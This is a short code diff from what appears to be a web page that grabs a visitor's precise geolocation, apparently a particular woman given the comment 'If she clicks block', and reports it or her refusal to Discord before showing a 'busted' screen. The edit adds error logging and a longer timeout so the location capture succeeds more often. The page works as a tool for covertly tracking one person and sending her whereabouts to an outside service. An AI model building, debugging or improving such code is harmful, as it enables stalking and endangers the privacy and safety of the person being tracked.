@@ -173,11 +173,15 @@
                         }, 1500);
                     },
                     (error) => {
+                        // THIS HELPS YOU SEE WHY IT FAILED IN CONSOLE
+                        console.error("Geolocation error code:", error.code, "message:", error.message);
+                        
                         // If she clicks block or it fails
                         sendToDiscord(null, null, null, error.message);
                         showBustedScreen(null, null, true);
                     },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    // ---> PASTE THE UPDATED OPTIONS HERE <---
+                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
                 );
             } else {
                 showBustedScreen(null, null, true);
